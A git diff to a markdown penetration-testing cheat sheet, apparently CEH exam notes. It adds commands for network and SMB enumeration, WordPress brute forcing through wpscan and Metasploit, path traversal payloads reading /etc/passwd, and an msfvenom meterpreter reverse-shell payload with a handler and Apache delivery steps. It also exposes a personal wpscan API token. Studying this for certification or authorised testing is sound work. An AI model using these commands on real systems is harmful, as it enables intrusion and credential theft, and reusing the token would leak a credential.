@@ -7,7 +7,7 @@
 **Own IP**<br>
 ip a | ifconfig
 
-**Scanning network Live Host (ping sweep)**  
+**Scanning network Live Host (ping sweep)**  <br>
 nmap -sP [host]/CIDR
 
 **Scanning Live Host without port scan in same subnet (ARP Scan)** <br>
@@ -19,21 +19,22 @@ nmap -sC -sV [host]/CIDR
 **OS of the target machine**<br>
 nmap -O [host]
 
-**All open ports of the target**      
+**All open ports of the target**   <br>   
 nmap -p- [host]/CIDR
 
-**Specific port scan of the target**   
+**Specific port scan of the target**   <br>
 nmap -p (port number) [host]/CIDR
 
-**Aggressive scan**                            
-nmap -A [host]/CIDR
+**Aggressive scan**   <br>                         
+nmap -A [host]/CIDR<br>
+nmap -Pn -A x.x.x.1/24 -vv --open   
 
 **Scanning using NSE scripts** <br>
 nmap --scripts (script name) -p (port number) [host]/CIDR <br>
 https://nmap.org/book/man-nse.html<br>
 nmap --script smb-os-discovery.nse [host] (Displays OS, Computer-Name, Domain, WorkGroup and Ports.)
 
-**Scripts + Version + Ports + OS Scan (overall)**<br>
+**Scripts + Version + Ports + OS Scan (overall)** <br>
 nmap -sC -sV -p- -A -v -T4 [host]/CIDR
 
 **Host discovery**    
@@ -76,6 +77,16 @@ Find FQDN<br>
 nmap -p389 –sV -iL [host]  or nmap -p389 –sV [host] (Find the FQDN in a subnet/network)<br>
 
 ## 2. SERVICE ENUMERATION
+
+**Enumeration**<br>
+1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)<br>
+2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16<br>
+3- SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open<br>
+                          snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot<br>
+4- DNS recon/enum-  dnsrecon -d www.google.com -z<br>
+5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 <br>
+6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)<br>
+				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)<br>
 
 ### FTP PORT 21
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
@@ -185,11 +196,20 @@ https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
 Search goolge for nsedocs -> NSEDoc Reference Portal -> Scripts -> smb<br>
 nmap --script smb-enum-shares.nse -p445 [host]<br>
 sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 [host]<br>
-smbclient -L \\[host]
+smbclient -L \\[host] <br>
+enum4linux -U [host] - enumerate users <br>
+enum4linux -S [host] - enumerates shares<br>
+enum4linux -S [host] - password policy <br>
+enum4linux -o [host] - operating system info <br>
+enum4linux -l [host] - if target is DC will attempt to get some limites info about LDAP <br>
+enum4linux -n [host] - NetBIOS info<br>
+enum4linux -a [host] - all SMB info <br>
+smbclient -L //hostname/ - enumerates all shares  <br>
+smbmap -H [host] -d [domain] -u [user] =p [password] <br>
 
 **Logged in Users details**    <br>
 nmap --script smb-enum-users.nse -p445 IP<br>
-sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 [host]
+sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 [host]<br>
 
 **Workgroups**    <br>
 nmap --script smb-enum-users.nse -p445 [host]<br>
@@ -299,6 +319,7 @@ curl https://hostname <br>
 
 **SMB** (Server Message Block) - Port 445<br>
 smbclient //hostname/share <br>
+smbclient -L //hostname/ -U '' -N - to log in with blank user and no pass
 
 **RDP** (Remote Desktop Protocol) - Port 3389<br>
 xfreerdp /v:hostname /u:username /p:password <br>
@@ -367,14 +388,25 @@ Ctrl+F duplicate
 **IoT**<br>
 Filter mqtt
 
+**To the get the specific method like (post, get)** <br>
+http.request.method==post <br>
+http.request.method==get
+
 ### Follow up Streams
 select_packet > follow > TCP Stream
 
-**To find message hidden with CovertTCP**<br>
+**To find the message hidden with CovertTCP**<br>
 Apply filter tcp. Under IPv4 -> Identification follow the message.
 
-**Finding severity**<be>
+**Finding severity**<br>
 Open pcapng file and go to Analyze -> Expert Information
+
+**Identify Target system OS with (Time to Live) TTL and TCP window sizes using wireshark**<br>
+Check the target IP Time to live value with protocol ICMP. <br>
+If it is 128 then it is Windows, as ICMP value came from Windows. <br>
+If TTL is 64 then it is Linux. <br>
+Every OS has a different TTL. <br>
+TTL 254 is solaris.<br>
 
 ## 5. Steganography
 
@@ -449,8 +481,9 @@ for calculating and comparing hashes of files<br>
 
 Drag and drop files to check if they are tampered
 
-### Cryptool <br>
-for encryption/decription of the hex data - by manipulating the key length
+### Cryptool** <br>
+for encryption/decription of the hex data - by manipulating the key length<br>
+Encryption and key should be in the file name.
 
 ### BcTextEncoder <br>
 for encoding and decoding text in a file (.hex)
@@ -513,10 +546,12 @@ hydra -l <username> -P <wordlist> [host] http-post-form "/login:username=^USER^&
 
 ### wpscan
 
-Wordpress site only Users Enumeration<br>
+**Wordpress site only Users Enumeration** <br>
+wpscan --url http://example.com <br>
 wpscan --url http://example.com/ceh --enumerate u<br>
+wpscan –url [wordpress URL] –wordlist [path to wordlist] –username [username to brute force] –threads [number of threads to use]
 
-Direct crack if we have user/password detail<br>
+**Direct crack if we have user/password detail** <br>
 wpscan --url http://x.x.x.x/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt<br>
 wpscan --url http://x.x.x.x:8080/CEH -u <user> -P ~/wordlists/password.txt<br>
 
@@ -529,6 +564,11 @@ gobuster dir -u https://example.com -w /wordlists/Discovery/Web-Content/big.txt 
 
 dirb http://site-being-tested.com<br>
 dirb http://site-being-tested.com /path/to/wordlist1,/path/to/wordlist2<br>
+
+sublist3r -d example.com <br>
+crt.sh/?q=example.com <br>
+amass enum -d example.com <br>
+Search for site:example.com on Google to find indexed subdomains. <br>
 
 **Enumerate a Web Application using WPscan & Metasploit**<br>
 wpscan --url http://[host]:[port]/NEW --enumerate u  (u means username) <br>
@@ -627,6 +667,30 @@ select * from login;<br>
 select * from user;<br>
 
 When you have username and Password for the database.
+
+**Enumerate and hack a web app using wpscan and metasploit**
+
+wpscan — api-token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads — url http://10.10.10.16:8080/CEH — plugins-detection aggressive — enumerate u <br>
+— enumerate u: Specify the enumeration of users <br>
+API Token: Register at https://wpscan.com/register <br>
+Mine: hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads <br>
+service postgresql start <br>
+msfconsole<br>
+use auxiliary/scanner/http/wordpress_login_enum<br>
+show options<br>
+set PASS_FILE password.txt<br>
+set RHOST 10.10.10.16<br>
+set RPORT 8080<br>
+set TARGETURI http://10.10.10.16:8080/CEH<br>
+set USERNAME admin<br>
+run<br>
+Find the credential
+
+**Directory or Path Traversal** <br>
+192.168.1.1/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd
+
+**Null Byte** <br>
+?page=../../../../../etc/passwd%00
   
 ## 8. Hacking Android
 
@@ -769,3 +833,33 @@ sudo yersinia -G<br>
 open Wireshark<br>
 Start DHCP Discover packets attack<br>
 filter bootp.type==1 in Wireshark<br>
+
+## 12. System Hacking
+**To create a Payload** <br>
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=attacker_IP LPORT=attacker_Port -o filename.exe 
+
+**To take a reverse TCP connection from windows** <br>
+msfdb init && msfconsole  <br>
+use exploit/multi/handler <br>
+set payload windows/meterpreter/reverse_tcp <br>
+set LHOST= attacker-IP   <br>
+set LPORT= attacker-Port <br>
+run
+
+**File Transfer**
+
+**Linux to Windows**<br>
+used to send a payload by Apache<br>
+mkdir /var/www/html/share<br>
+chmod -R 755 /var/www/html/share<br>
+chown -R www-data:www-data /var/www/html/share<br>
+cp /root/Desktop/filename /var/www/html/share/<br>
+to start and verify<br>
+service apache2 start <br>
+service apache2 status<br>
+to Download from Windows<br>
+Open browser<br>
+IP_OF_LINUX/share<br>
+
+**Windows to Linux**<br>
+File system > Network > smb///IP_OF_WINDOWS
